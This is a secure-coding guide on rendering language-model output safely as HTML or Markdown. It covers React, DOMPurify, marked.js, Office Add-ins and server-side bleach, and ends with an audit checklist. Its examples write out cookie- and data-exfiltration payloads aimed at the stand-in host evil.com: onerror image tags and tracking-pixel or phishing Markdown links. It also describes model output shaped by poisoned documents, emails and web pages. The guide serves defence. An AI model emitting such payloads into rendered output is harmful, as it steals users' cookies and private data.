# LLM Output Rendering Safety

When LLM output is rendered as HTML or Markdown, malicious content can execute scripts, exfiltrate data, or trick users into dangerous actions.

## The Risk

LLM output is **untrusted content**. Even if your system prompt is safe, the model may have processed:
- Malicious documents (RAG)
- Attacker-controlled emails
- Poisoned web pages
- Adversarial user input

If rendered without sanitization, this content can:
- Execute JavaScript (XSS)
- Exfiltrate data via image/link URLs
- Phish users with fake UI elements
- Trigger downloads or navigations

## React Markdown Rendering

### Dangerous: rehype-raw

`rehype-raw` allows raw HTML in Markdown, bypassing React's XSS protections:

```jsx
// DANGEROUS - allows arbitrary HTML execution
import ReactMarkdown from 'react-markdown';
import rehypeRaw from 'rehype-raw';

<ReactMarkdown rehypePlugins={[rehypeRaw]}>
  {llmOutput}
</ReactMarkdown>

// Attacker output: <img src="x" onerror="fetch('evil.com?'+document.cookie)">
// Result: Cookie exfiltration
```

### Safe: No rehype-raw + allowedElements

```jsx
import ReactMarkdown from 'react-markdown';

// SAFE - only allow specific elements
const ALLOWED_ELEMENTS = [
  'p', 'strong', 'em', 'code', 'pre',
  'ul', 'ol', 'li', 'blockquote',
  'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
  'a', 'img'  // With custom renderers below
];

<ReactMarkdown
  allowedElements={ALLOWED_ELEMENTS}
  components={{
    // Custom link renderer with safety checks
    a: ({href, children}) => (
      <SafeLink href={href}>{children}</SafeLink>
    ),
    // Custom image renderer
    img: ({src, alt}) => (
      <SafeImage src={src} alt={alt} />
    )
  }}
>
  {llmOutput}
</ReactMarkdown>
```

### Safe Link Component

```jsx
function SafeLink({ href, children }) {
  const isSafe = useMemo(() => {
    if (!href) return false;

    try {
      const url = new URL(href, window.location.origin);

      // Block javascript: URLs
      if (url.protocol === 'javascript:') return false;

      // Block data: URLs (can contain scripts)
      if (url.protocol === 'data:') return false;

      // Optional: allowlist domains
      const ALLOWED_DOMAINS = ['docs.example.com', 'github.com'];
      if (!ALLOWED_DOMAINS.includes(url.hostname)) {
        return false;
      }

      return true;
    } catch {
      return false;
    }
  }, [href]);

  if (!isSafe) {
    return <span>{children}</span>;  // Render as plain text
  }

  return (
    <a
      href={href}
      target="_blank"
      rel="noopener noreferrer"  // Prevent tab-nabbing
    >
      {children}
    </a>
  );
}
```

### Safe Image Component

```jsx
function SafeImage({ src, alt }) {
  const safeSrc = useMemo(() => {
    if (!src) return null;

    try {
      const url = new URL(src, window.location.origin);

      // Only allow https
      if (url.protocol !== 'https:') return null;

      // Block tracking pixels (1x1 with query params = likely exfil)
      // Note: can't detect until loaded, so allowlist domains instead

      // Allowlist image domains
      const ALLOWED_IMAGE_DOMAINS = [
        'images.example.com',
        'cdn.example.com'
      ];

      if (!ALLOWED_IMAGE_DOMAINS.includes(url.hostname)) {
        return null;
      }

      return src;
    } catch {
      return null;
    }
  }, [src]);

  if (!safeSrc) {
    return <span>[Image blocked]</span>;
  }

  return <img src={safeSrc} alt={alt} loading="lazy" />;
}
```

## dangerouslySetInnerHTML

Never use with LLM output:

```jsx
// DANGEROUS - XSS vulnerability
<div dangerouslySetInnerHTML={{ __html: llmOutput }} />

// If you MUST use it, sanitize first
import DOMPurify from 'dompurify';

const sanitized = DOMPurify.sanitize(llmOutput, {
  ALLOWED_TAGS: ['p', 'strong', 'em', 'code', 'pre', 'ul', 'ol', 'li'],
  ALLOWED_ATTR: []  // No attributes = no onclick, no href, no src
});

<div dangerouslySetInnerHTML={{ __html: sanitized }} />
```

## DOMPurify Configuration

```javascript
import DOMPurify from 'dompurify';

// Strict config for LLM output
const DOMPURIFY_CONFIG = {
  ALLOWED_TAGS: [
    'p', 'br', 'strong', 'em', 'code', 'pre',
    'ul', 'ol', 'li', 'blockquote',
    'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
    'table', 'thead', 'tbody', 'tr', 'th', 'td'
    // Note: no 'a', 'img', 'script', 'style', 'iframe'
  ],
  ALLOWED_ATTR: [
    'class'  // Only for styling, no event handlers
  ],
  ALLOW_DATA_ATTR: false,
  FORBID_TAGS: ['script', 'style', 'iframe', 'object', 'embed', 'form'],
  FORBID_ATTR: ['onclick', 'onerror', 'onload', 'style']
};

function sanitizeLLMOutput(html) {
  return DOMPurify.sanitize(html, DOMPURIFY_CONFIG);
}
```

### Adding Links Safely with DOMPurify

```javascript
import DOMPurify from 'dompurify';

// Hook to validate URLs before allowing
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.tagName === 'A') {
    const href = node.getAttribute('href') || '';

    // Block dangerous protocols
    if (href.startsWith('javascript:') || href.startsWith('data:')) {
      node.removeAttribute('href');
      return;
    }

    // Add security attributes
    node.setAttribute('target', '_blank');
    node.setAttribute('rel', 'noopener noreferrer');

    // Optional: allowlist domains
    try {
      const url = new URL(href, window.location.origin);
      if (!ALLOWED_DOMAINS.includes(url.hostname)) {
        node.removeAttribute('href');
      }
    } catch {
      node.removeAttribute('href');
    }
  }

  // Block image exfiltration
  if (node.tagName === 'IMG') {
    const src = node.getAttribute('src') || '';
    try {
      const url = new URL(src, window.location.origin);
      if (!ALLOWED_IMAGE_DOMAINS.includes(url.hostname)) {
        node.removeAttribute('src');
      }
    } catch {
      node.removeAttribute('src');
    }
  }
});
```

## Marked.js Configuration

```javascript
import { marked } from 'marked';
import DOMPurify from 'dompurify';

// Disable dangerous features
marked.setOptions({
  headerIds: false,  // Prevent ID injection
  mangle: false
});

// Custom renderer for links
const renderer = new marked.Renderer();
renderer.link = (href, title, text) => {
  // Validate URL
  if (href.startsWith('javascript:') || href.startsWith('data:')) {
    return text;  // Plain text, no link
  }
  return `<a href="${href}" target="_blank" rel="noopener noreferrer">${text}</a>`;
};

renderer.image = (src, title, alt) => {
  // Block or validate images
  return `[Image: ${alt}]`;  // Or validate src domain
};

marked.use({ renderer });

function renderLLMMarkdown(markdown) {
  const html = marked.parse(markdown);
  return DOMPurify.sanitize(html, DOMPURIFY_CONFIG);
}
```

## Data Exfiltration via URLs

Attackers can exfiltrate data through URL parameters:

```markdown
<!-- Attacker-crafted LLM output -->
![tracking](https://evil.com/pixel.gif?data=SENSITIVE_INFO_HERE)

[Click here](https://evil.com/phish?user=TARGET)

<img src="https://evil.com/collect?cookie=" onerror="this.src+='cookie='+document.cookie">
```

**Mitigations:**
1. Allowlist image/link domains
2. Block external URLs entirely (show text instead)
3. Proxy external images through your server
4. Strip query parameters from external URLs

## Office Add-ins Considerations

Office Add-ins have additional constraints:

```javascript
// Office Add-ins: use Office.js APIs, not innerHTML
// Links should use Office.UI.displayDialogAsync for navigation

function handleLinkClick(url) {
  // Validate URL first
  if (!isAllowedUrl(url)) {
    return;
  }

  // Open in dialog, not main window
  Office.context.ui.displayDialogAsync(
    url,
    { height: 50, width: 50 },
    (result) => { /* handle */ }
  );
}
```

## Server-Side Rendering

If rendering Markdown server-side:

```python
import bleach
import markdown

# Allowlisted tags and attributes
ALLOWED_TAGS = [
    'p', 'br', 'strong', 'em', 'code', 'pre',
    'ul', 'ol', 'li', 'blockquote',
    'h1', 'h2', 'h3', 'h4', 'h5', 'h6'
]
ALLOWED_ATTRIBUTES = {}  # No attributes

def render_llm_markdown(text: str) -> str:
    # Convert markdown to HTML
    html = markdown.markdown(text)
    # Sanitize
    return bleach.clean(
        html,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRIBUTES,
        strip=True
    )
```

## Audit Checklist

- [ ] Is `rehype-raw` used? Remove it or add strict allowedElements
- [ ] Is `dangerouslySetInnerHTML` used with LLM output? Replace with sanitized rendering
- [ ] Are links validated before rendering? Check for javascript:, data: protocols
- [ ] Are images domain-restricted? Block external image URLs or proxy them
- [ ] Is DOMPurify configured with strict allowlists?
- [ ] Are external URLs blocked or allowlisted?
- [ ] Do links have `rel="noopener noreferrer"`?

## References

- react-markdown security documentation
- DOMPurify configuration guide
- OWASP XSS Prevention Cheat Sheet
- MDN: rel=noopener
